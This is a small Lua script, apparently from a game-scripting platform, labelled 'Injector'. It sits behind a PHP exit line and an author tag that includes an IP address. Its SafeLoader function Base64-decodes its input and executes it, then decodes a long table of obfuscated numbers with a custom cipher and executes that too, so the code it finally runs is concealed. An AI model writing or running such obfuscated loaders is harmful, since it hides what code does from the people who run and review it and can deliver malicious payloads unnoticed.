<?php exit() ?>--by ferrarino1com 80.31.234.122
--Injector
_G.SafeLoader = function(b)
	local ml = function(t) load(t)() end
	local D = function(t)
		local s = ""
		local ps = 0
		for i = 1, #t do
			v = t[i]
			b = ((v + 4 * i - ps * 2 + 65) / 2 )
			s = s .. string.char(b)
			ps = b
		end
		return s
	end
	ml(Base64Decode(b)) -- sets _G.SS to true

	t = {-51, 161, 361, 339, 307, 321, 187, 181, 213, 59, 77, 73, 15, 111, 177, 151, 73, 89, 191, 163, 153, 189, 85, 47, 129, 133, 133, 161, 187, 165, 135, 105, 111, 141, 99, 85, 89, 105, 147, 91, 125, 141, -21, -83, 85, 51, -121, -169, -223, -31, 169, 147, 115, 129, -5, 9, 5, -111, -115, -81, 73, 133, 109, 101, 39, 25, 77, 63, 61, 77, -49, -59, -43, -197, -209, -185, -217, -245, -79, 79, 43, 37, -101, -251, -207, -61, 47, 21, 7, -127, -267, -331, -399, -207, -7, -29, -61, -47, -181, -177, -181, -287, -291, -257, -103, -43, -67, -75, -137, -151, -99, -113, -115, -99, -225, -235, -219, -373, -385, -361, -393, -421, -265, -143, -141, -109, -275, -427, -383, -237, -129, -155, -169, -303, -443, -507, -575, -457, -277, -191, -267, -273, -165, -179, -227, -277, -277, -259, -301, -299, -237, -209, -227, -233, -373, -541, -421, -265, -271, -273, -279, -319, -321, -315, -315, -317, -319, -321, -441, -455, -329, -313, -295, -315, -471, -479, -353, -337, -495, -629, -637, -661, -501, -371, -405, -519, -497, -385, -389, -533, -673, -681, -705, -539, -489, -659, -693, -673, -637, -539, -445, -441, -567, -669, -643, -531, -475, -477, -479, -503, -627, -599, -601, -747, -741, -769, -789, -637, -595, -755, -789, -769, -733, -635, -541, -537, -663, -765, -739, -627, -571, -573, -575, -599, -723, -705, -707, -847, -869, -757, -591, -579, -619, -611, -603, -617, -611, -757, -899, -919, -803, -651, -657, -799, -983, -1049, }
	if _G.SS then
		ml(D(t))
	end
end